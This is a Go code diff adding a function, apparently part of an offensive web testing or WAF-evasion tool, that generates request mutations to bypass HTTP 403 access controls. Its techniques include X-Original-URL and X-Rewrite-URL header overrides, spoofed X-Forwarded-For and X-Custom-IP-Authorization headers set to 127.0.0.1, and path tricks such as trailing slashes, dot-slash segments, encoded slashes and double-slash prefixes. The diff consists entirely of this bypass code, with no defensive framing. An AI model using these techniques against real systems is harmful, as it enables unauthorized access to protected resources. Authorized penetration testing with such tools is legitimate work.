@@ -245,3 +245,74 @@ func EvasionStrategiesFor(vendor string) []EvasionTechnique {
 		}
 	}
 }
+
+// Bypass403Techniques returns path mutations and header sets that are
+// known to bypass application-level 403 controls independently of WAF vendor.
+func Bypass403Techniques(rawPath string, headers map[string]string) []EvasionTechnique {
+	cloneHeaders := func(h map[string]string) map[string]string {
+		n := make(map[string]string, len(h))
+		for k, v := range h {
+			n[k] = v
+		}
+		return n
+	}
+
+	return []EvasionTechnique{
+		{
+			Name: "x-original-url",
+			ModifyRequest: func(p string, h map[string]string, _ string) (string, map[string]string) {
+				nh := cloneHeaders(h)
+				nh["X-Original-URL"] = p
+				return "/", nh
+			},
+		},
+		{
+			Name: "x-rewrite-url",
+			ModifyRequest: func(p string, h map[string]string, _ string) (string, map[string]string) {
+				nh := cloneHeaders(h)
+				nh["X-Rewrite-URL"] = p
+				return "/", nh
+			},
+		},
+		{
+			Name: "x-custom-ip-127",
+			ModifyRequest: func(p string, h map[string]string, _ string) (string, map[string]string) {
+				nh := cloneHeaders(h)
+				nh["X-Custom-IP-Authorization"] = "127.0.0.1"
+				return p, nh
+			},
+		},
+		{
+			Name: "trailing-slash",
+			ModifyRequest: func(p string, h map[string]string, _ string) (string, map[string]string) {
+				return strings.TrimRight(p, "/") + "/", cloneHeaders(h)
+			},
+		},
+		{
+			Name: "dot-slash",
+			ModifyRequest: func(p string, h map[string]string, _ string) (string, map[string]string) {
+				return p + "/./", cloneHeaders(h)
+			},
+		},
+		{
+			Name: "url-encoded-slash",
+			ModifyRequest: func(p string, h map[string]string, _ string) (string, map[string]string) {
+				return strings.Replace(p, "/", "%2f", 1), cloneHeaders(h)
+			},
+		},
+		{
+			Name: "double-slash-prefix",
+			ModifyRequest: func(p string, h map[string]string, _ string) (string, map[string]string) {
+				return "//" + strings.TrimPrefix(p, "/"), cloneHeaders(h)
+			},
+		},
+		{
+			Name: "x-forwarded-for-127",
+			ModifyRequest: func(p string, h map[string]string, _ string) (string, map[string]string) {
+				nh := cloneHeaders(h)
+				nh["X-Forwarded-For"] = "127.0.0.1"
+				return p, nh
+			},
+		},
+	}
+}
